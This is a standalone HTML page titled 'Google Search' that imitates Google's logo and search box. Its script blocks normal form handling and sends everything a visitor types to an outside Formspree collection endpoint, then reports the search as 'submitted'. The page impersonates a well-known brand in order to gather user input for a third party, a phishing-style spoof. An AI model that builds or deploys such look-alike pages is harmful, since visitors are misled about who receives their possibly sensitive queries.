<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Search</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: white;
        }

        .page {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 170px;
        }

        .logo {
            font-size: 70px;
            font-weight: bold;
            letter-spacing: -5px;
            margin-bottom: 30px;
        }

        .g1 { color: #4285F4; }
        .o1 { color: #EA4335; }
        .o2 { color: #FBBC05; }
        .g2 { color: #4285F4; }
        .l  { color: #34A853; }
        .e  { color: #EA4335; }

        .search-form {
            width: 90%;
            max-width: 580px;
        }

        .search-box {
            width: 100%;
            height: 48px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            display: flex;
            align-items: center;
            padding: 0 18px;
            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.15);
        }

        .search-icon {
            width: 20px;
            height: 20px;
            margin-right: 12px;
        }

        .search-input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 16px;
        }

        .buttons {
            text-align: center;
            margin-top: 25px;
        }

        button {
            padding: 10px 20px;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            background: #f8f9fa;
            color: #202124;
            font-size: 14px;
            cursor: pointer;
        }

        button:hover {
            border: 1px solid #dadce0;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }

        #message {
            margin-top: 20px;
            font-size: 14px;
        }

        .success {
            color: #188038;
        }

        .error {
            color: #d93025;
        }
    </style>
</head>

<body>

    <div class="page">

        <!-- Google-style logo -->
        <div class="logo">
            <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
        </div>

        <!-- Search Form -->
        <form id="searchForm" class="search-form">

            <div class="search-box">

                <svg class="search-icon"
                     viewBox="0 0 24 24"
                     fill="none"
                     stroke="#5f6368"
                     stroke-width="2">

                    <circle cx="11" cy="11" r="7"></circle>
                    <line x1="16.5" y1="16.5" x2="21" y2="21"></line>

                </svg>

                <input
                    type="text"
                    id="searchInput"
                    name="search_text"
                    class="search-input"
                    placeholder="Search..."
                    autocomplete="off"
                    required
                >

            </div>

            <div class="buttons">
                <button type="submit">Google Search</button>
            </div>

        </form>

        <div id="message"></div>

    </div>


    <script>

        const form = document.getElementById("searchForm");
        const input = document.getElementById("searchInput");
        const message = document.getElementById("message");

        form.addEventListener("submit", async function(event) {

            // IMPORTANT:
            // Prevent Formspree from opening its Thanks page
            event.preventDefault();

            const searchText = input.value.trim();

            if (!searchText) {
                return;
            }

            message.className = "";
            message.innerHTML = "Submitting...";

            try {

                const response = await fetch(
                    "https://formspree.io/f/mljrbqdp",
                    {
                        method: "POST",

                        headers: {
                            "Accept": "application/json",
                            "Content-Type": "application/json"
                        },

                        body: JSON.stringify({
                            search_text: searchText
                        })
                    }
                );

                if (response.ok) {

                    message.className = "success";
                    message.innerHTML = "✓ Search submitted successfully!";

                    input.value = "";

                } else {

                    message.className = "error";
                    message.innerHTML = "✗ Submission failed.";

                }

            } catch (error) {

                message.className = "error";
                message.innerHTML = "✗ Something went wrong.";

            }

        });

    </script>

</body>
</html>
